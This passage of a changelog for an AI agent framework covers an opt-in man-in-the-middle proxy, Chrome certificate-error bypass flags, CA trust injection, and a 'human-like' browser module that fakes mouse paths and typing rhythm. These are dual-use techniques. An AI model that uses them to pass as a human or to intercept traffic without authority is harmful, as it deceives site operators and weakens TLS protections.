- Bindings persisted to `action-bindings.jsonl` under MITM confdir
- Tests: `test/browser-sense.test.mjs`

## 3.44.0 — Horizon 0 production foundations

First-principles hardening of the browser organism (identity, CDP, MITM, motor readiness):

- `src/browser/horizon0.mjs` — production Chrome arg builder, profile lock, flow rotation, checklist
- BrowserService: `--remote-allow-origins=*`, `--disable-dev-shm-usage`, headed window geometry, UA override
- Fix Docker flag bug (`--no-sandbox --disable-gpu` was a single invalid argv entry)
- Durable profile exclusive lock + reclaim stale PID; release on stop/exit
- CDP port acquire timeout (`XCLAW_BROWSER_PORT_TIMEOUT_MS`, default 30s)
- MITM: rotate `flows.jsonl` at start + supervisor tick; recover dead mitmdump
- Supervisor logs Horizon 0 checklist on boot
- Doctor: `h0.*` checks + production flag verification
- Tests: `test/browser-horizon0.test.mjs`

## 3.43.0 — Mitmproxy CA certificate management

- `getMitmCaInfo` / `ensureMitmCa` / `exportMitmCa` / `mitmCaStatus`
- Agent tool `mitm_ca`: status | ensure | export | trust
- Supervisor runs `ensureMitmCa` before wait-ready (SPKI on first Chrome start)
- Doctor reports CA subject / expiry / SPKI prefix
- Export writes PEM + P12 + `.spki` sidecar + chrome flag

## 3.42.3 — MITM integration hardening

- `findMitmdump` searches `~/.local/bin` even when PATH is minimal
- `mitmEnvFromConfig()` + inject into computer spawn and supervisor gateway env
- `waitForMitmReady()` — supervisor waits for listen + CA + ready before continuing
- `XCLAW_CHROME_MITM_ARGS` honored by BrowserService (bundle)
- Doctor: `mitm.binary` / `mitm.proxy` / `mitm.ca`
- INSTALL + OPS startup order; Dockerfile optional mitmproxy hint

## 3.42.2 — Addon hooks expansion

- `requestheaders` early block (before body)
- `responseheaders` optional Set-Cookie strip (`XCLAW_MITM_STRIP_COOKIES`)
- `error` + `tls_failed_client` / `tls_failed_server` → flows + stats.json
- `running` writes `confdir/ready` for supervisor probe
- `mitm_status` surfaces ready / errors / blocked / tlsFail*

## 3.42.1 — Mitmproxy scripting surface

- Expanded `addons.py`: block / path-map / body capture / host dumps / WS echo
- Env: `XCLAW_MITM_BLOCK`, `XCLAW_MITM_MAP`, `XCLAW_MITM_CAPTURE_BODY`, `XCLAW_MITM_BODY_MAX`, `XCLAW_MITM_DUMP_HOSTS`
- Docs: `docs/MITM_SCRIPTING.md`
- Example: `src/browser/mitm-confdir/examples/inject_header.py`

## 3.42.0 — M3 MITM agent tools

- `mitm_status` — enabled / running / port / CA / flowCount
- `mitm_flows` — filtered list (host, method, status, urlContains, sinceTs)
- `mitm_clear_flows` — truncate flows.jsonl
- `mitm_control` — start | stop | status sidecar
- `readMitmFlows` filters + `mitmStatus` / `clearMitmFlows` / `formatMitmFlows`
- Registered via `createBrowserTools` → agent local tools
- Tests: 22/22

## 3.41.0 — M2 Chrome proxy + CA trust

- `chromeMitmArgs()` / `findMitmCaCert()` / `mitmCaSpkiHash()` / `trustMitmCaInProfile()`
- `BrowserService.ensureRunning`: when `XCLAW_MITM` on → `--proxy-server` + `--proxy-bypass-list=<-loopback>`
- Prefer `--ignore-certificate-errors-spki-list=<SPKI>` from mitmproxy CA (openssl)
- Optional `certutil` import into profile NSS DB
- Lab escape: `XCLAW_MITM_INSECURE_CERTS=1` → `--ignore-certificate-errors`
- Runtime CDP `Security.setIgnoreCertificateErrors(true)` after connect
- Tests: 19/19 in `test/browser-mitm.test.mjs`

## 3.40.0 — M1 MITM sidecar (opt-in)

- Feature gate: `XCLAW_MITM=true` or `browser.mitm.enabled` (default **off**)
- `src/browser/mitm.mjs` — start/stop mitmdump, confdir, pid, flow log
- Package confdir + `addons.py` (redacts secrets, allowlist, flows.jsonl)
- Supervisor: `ensureMitm()` on boot + each tick
- `chromeProxyArgs()` ready for M2 (`--proxy-server=http://127.0.0.1:4444`)
- Env: `XCLAW_MITM`, `XCLAW_MITM_PORT`, `XCLAW_MITM_CONFDIR`, `XCLAW_MITMDUMP`, `XCLAW_MITM_ALLOWLIST`, `XCLAW_MITM_SSL_VERIFY`
- Tests: `test/browser-mitm.test.mjs` (14/14)

## 3.39.0 — B0 Human-like browser (1 year ahead)

- Durable Chromium profile vault (`XCLAW_BROWSER_PROFILE_DIR`, default `~/.xclaw/browser-profiles/default`)
- Headed mode via `XCLAW_BROWSER_HEADED=1` (visible window, human presence)
- `src/browser/humanize.mjs` — Gaussian delays, cubic-bezier mouse paths, typing cadence, scroll momentum
- `src/browser/profile.mjs` — resolve/seed/lock durable profiles
- `ensureRunning` respects profile vault; `stop` never wipes durable data
- Config: `browser.profileDir`, `browser.headless`, `browser.humanize`, `browser.humanizeSpeed`, `browser.copySession`
- Env: `XCLAW_BROWSER_PROFILE_DIR`, `XCLAW_BROWSER_HEADED`, `XCLAW_BROWSER_HUMANIZE`, `XCLAW_BROWSER_HUMANIZE_SPEED`, `XCLAW_BROWSER_COPY_SESSION`

## 0.7.3

### Autonomy & eval
- Multi-step **workflow-publish-post** eval case (drafts → post + checklist)
- Live baseline **8/8** on `grok-4.3` (smoke → workflow)
- Eval **token totals** in reports; **eval history** (`~/.xclaw/eval-history.jsonl`)
- `GET /eval/baseline`, `GET /eval/history`
- `npm run eval:suite`, `npm run eval:ci`, `npm run package`

### Jobs & queue
- Job runtime: verify, evidence, history
- **Serial job queue** (`~/.xclaw/job-queue/`, concurrency 1)
- `POST/GET /queue`, CLI `xclaw queue`
- No-API-key fail-fast on queue workers

### Ops
- **Eval cron** (default 24h) + doctor cron
- `ensureComputer` preflight (agent, eval, suite)
- Doctor checks: queue depth, eval cron registration
- Control UI: jobs, queue, skills stats, eval baseline/history
- WebChat **job mode** checkbox

### Robustness
- Fixed `ensureComputer` import in agent loop
- Case-insensitive verify checks
- Clearer computer ECONNREFUSED messages
- Transport retry + jitter + Retry-After (Phase 7)

## 0.7.0 – 0.7.2

- Phase 7 hardening: tests, config validation, doctor CLI, safer `autoApprove: false`
- Skill stats + proposals (review-only drafts)
- Package scripts and Control UI job runner
